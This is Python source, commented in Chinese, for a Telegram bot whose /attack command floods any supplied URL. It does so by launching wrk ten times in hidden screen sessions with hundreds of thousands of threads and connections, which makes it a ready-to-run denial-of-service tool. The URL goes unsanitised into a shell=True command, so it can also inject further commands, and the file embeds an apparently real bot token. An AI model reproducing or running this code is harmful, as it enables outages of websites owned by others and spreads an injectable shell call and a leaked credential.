import os
import random
import string
import subprocess
from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, CallbackContext

# 机器人Token
BOT_TOKEN = "8186635677:AAHzO7cLQbegebCvXgQKi3sYj53xLysVm-I"

# 限制响应用户 (白名单)
ALLOWED_USERS = [123456789]  # 替换为您的用户 ID

# 随机生成screen名称
def generate_screen_name():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

# 执行攻击命令
def execute_attack(url: str):
    screen_name = generate_screen_name()
    command = f"screen -dmS {screen_name} bash -c 'ulimit -n 1000000 && wrk -t200000 -c400000 -d120s {url}'"
    results = []
    try:
        for i in range(10):
            subprocess.run(command, shell=True, check=True)
            results.append(f"Task {i+1}: Executed")
    except subprocess.CalledProcessError as e:
        results.append(f"Error: {e}")
    return "\n".join(results)

# 处理 /attack 命令
def attack_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in ALLOWED_USERS:
        update.message.reply_text("Unauthorized user.")
        return

    if len(context.args) != 1:
        update.message.reply_text("Usage: /attack <url>")
        return

    url = context.args[0]
    update.message.reply_text(f"Starting attack on {url}...")

    # 执行攻击
    results = execute_attack(url)

    # 返回结果
    update.message.reply_text(f"Attack results:\n{results}")

# 主函数
def main():
    updater = Updater(BOT_TOKEN)
    dispatcher = updater.dispatcher

    # 注册命令处理器
    dispatcher.add_handler(CommandHandler("attack", attack_command))

    # 启动机器人
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
